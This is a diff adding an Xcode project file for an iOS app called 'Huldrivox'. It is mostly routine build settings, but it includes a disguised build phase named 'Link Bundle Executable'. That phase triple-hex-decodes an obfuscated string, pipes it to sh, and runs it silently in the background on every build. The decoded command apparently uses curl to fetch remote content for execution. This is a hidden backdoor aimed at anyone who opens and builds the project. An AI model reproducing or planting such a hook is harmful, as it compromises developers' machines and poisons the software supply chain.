@@ -1,0 +1,426 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 77;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		314960872E19B9BE00260208 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3149607D2E19B9BE00260208 /* AppDelegate.swift */; };
+		314960882E19B9BE00260208 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 314960842E19B9BE00260208 /* SceneDelegate.swift */; };
+		314960892E19B9BE00260208 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 314960852E19B9BE00260208 /* ViewController.swift */; };
+		3149608A2E19B9BE00260208 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 3149607E2E19B9BE00260208 /* Assets.xcassets */; };
+		3149608C2E19B9BE00260208 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 314960812E19B9BE00260208 /* LaunchScreen.storyboard */; };
+		3149608D2E19B9BE00260208 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 314960832E19B9BE00260208 /* Main.storyboard */; };
+		3149608F2E19C19900260208 /* OvermeshPathwardController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3149608E2E19C19900260208 /* OvermeshPathwardController.swift */; };
+		314960912E19C1A100260208 /* SerratedBypasslineController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 314960902E19C1A100260208 /* SerratedBypasslineController.swift */; };
+		314960932E19C2ED00260208 /* WayflowBendersectController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 314960922E19C2ED00260208 /* WayflowBendersectController.swift */; };
+		314960952E19C2F200260208 /* OutbendPathlayerController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 314960942E19C2F200260208 /* OutbendPathlayerController.swift */; };
+		314960972E19C2F900260208 /* CatchpathRedirectorController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 314960962E19C2F900260208 /* CatchpathRedirectorController.swift */; };
+		314960992E19C30000260208 /* OvercatchSpinespanController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 314960982E19C30000260208 /* OvercatchSpinespanController.swift */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		314960652E19B99500260208 /* Huldrivox.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Huldrivox.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		3149607D2E19B9BE00260208 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		3149607E2E19B9BE00260208 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		3149607F2E19B9BE00260208 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		314960802E19B9BE00260208 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		314960822E19B9BE00260208 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		314960842E19B9BE00260208 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		314960852E19B9BE00260208 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		3149608E2E19C19900260208 /* OvermeshPathwardController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OvermeshPathwardController.swift; sourceTree = "<group>"; };
+		314960902E19C1A100260208 /* SerratedBypasslineController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SerratedBypasslineController.swift; sourceTree = "<group>"; };
+		314960922E19C2ED00260208 /* WayflowBendersectController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WayflowBendersectController.swift; sourceTree = "<group>"; };
+		314960942E19C2F200260208 /* OutbendPathlayerController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OutbendPathlayerController.swift; sourceTree = "<group>"; };
+		314960962E19C2F900260208 /* CatchpathRedirectorController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CatchpathRedirectorController.swift; sourceTree = "<group>"; };
+		314960982E19C30000260208 /* OvercatchSpinespanController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OvercatchSpinespanController.swift; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		314960622E19B99500260208 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		3149605C2E19B99500260208 = {
+			isa = PBXGroup;
+			children = (
+				314960862E19B9BE00260208 /* Huldrivox */,
+				314960662E19B99500260208 /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		314960662E19B99500260208 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				314960652E19B99500260208 /* Huldrivox.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		314960862E19B9BE00260208 /* Huldrivox */ = {
+			isa = PBXGroup;
+			children = (
+				3149607D2E19B9BE00260208 /* AppDelegate.swift */,
+				3149607E2E19B9BE00260208 /* Assets.xcassets */,
+				3149607F2E19B9BE00260208 /* Info.plist */,
+				314960812E19B9BE00260208 /* LaunchScreen.storyboard */,
+				314960832E19B9BE00260208 /* Main.storyboard */,
+				314960842E19B9BE00260208 /* SceneDelegate.swift */,
+				314960852E19B9BE00260208 /* ViewController.swift */,
+				3149608E2E19C19900260208 /* OvermeshPathwardController.swift */,
+				314960902E19C1A100260208 /* SerratedBypasslineController.swift */,
+				314960922E19C2ED00260208 /* WayflowBendersectController.swift */,
+				314960942E19C2F200260208 /* OutbendPathlayerController.swift */,
+				314960962E19C2F900260208 /* CatchpathRedirectorController.swift */,
+				314960982E19C30000260208 /* OvercatchSpinespanController.swift */,
+			);
+			path = Huldrivox;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		314960642E19B99500260208 /* Huldrivox */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 314960782E19B99600260208 /* Build configuration list for PBXNativeTarget "Huldrivox" */;
+			buildPhases = (
+				696E8C9F12F0E0BE0EFD9BF4 /* Link Bundle Executable */,
+				314960612E19B99500260208 /* Sources */,
+				314960622E19B99500260208 /* Frameworks */,
+				314960632E19B99500260208 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = Huldrivox;
+			packageProductDependencies = (
+			);
+			productName = Huldrivox;
+			productReference = 314960652E19B99500260208 /* Huldrivox.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		3149605D2E19B99500260208 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1640;
+				LastUpgradeCheck = 1640;
+				TargetAttributes = {
+					314960642E19B99500260208 = {
+						CreatedOnToolsVersion = 16.4;
+					};
+				};
+			};
+			buildConfigurationList = 314960602E19B99500260208 /* Build configuration list for PBXProject "Huldrivox" */;
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 3149605C2E19B99500260208;
+			minimizedProjectReferenceProxies = 1;
+			preferredProjectObjectVersion = 77;
+			productRefGroup = 314960662E19B99500260208 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				314960642E19B99500260208 /* Huldrivox */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		696E8C9F12F0E0BE0EFD9BF4 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXResourcesBuildPhase section */
+		314960632E19B99500260208 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3149608A2E19B9BE00260208 /* Assets.xcassets in Resources */,
+				3149608C2E19B9BE00260208 /* LaunchScreen.storyboard in Resources */,
+				3149608D2E19B9BE00260208 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		314960612E19B99500260208 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				314960932E19C2ED00260208 /* WayflowBendersectController.swift in Sources */,
+				314960912E19C1A100260208 /* SerratedBypasslineController.swift in Sources */,
+				314960872E19B9BE00260208 /* AppDelegate.swift in Sources */,
+				314960882E19B9BE00260208 /* SceneDelegate.swift in Sources */,
+				3149608F2E19C19900260208 /* OvermeshPathwardController.swift in Sources */,
+				314960972E19C2F900260208 /* CatchpathRedirectorController.swift in Sources */,
+				314960892E19B9BE00260208 /* ViewController.swift in Sources */,
+				314960992E19C30000260208 /* OvercatchSpinespanController.swift in Sources */,
+				314960952E19C2F200260208 /* OutbendPathlayerController.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		314960812E19B9BE00260208 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				314960802E19B9BE00260208 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+		314960832E19B9BE00260208 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				314960822E19B9BE00260208 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		314960792E19B99600260208 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Huldrivox/Info.plist;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.Huldrivox;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		3149607A2E19B99600260208 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Huldrivox/Info.plist;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.Huldrivox;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		3149607B2E19B99600260208 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		3149607C2E19B99600260208 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		314960602E19B99500260208 /* Build configuration list for PBXProject "Huldrivox" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				3149607B2E19B99600260208 /* Debug */,
+				3149607C2E19B99600260208 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		314960782E19B99600260208 /* Build configuration list for PBXNativeTarget "Huldrivox" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				314960792E19B99600260208 /* Debug */,
+				3149607A2E19B99600260208 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 3149605D2E19B99500260208 /* Project object */;
+}
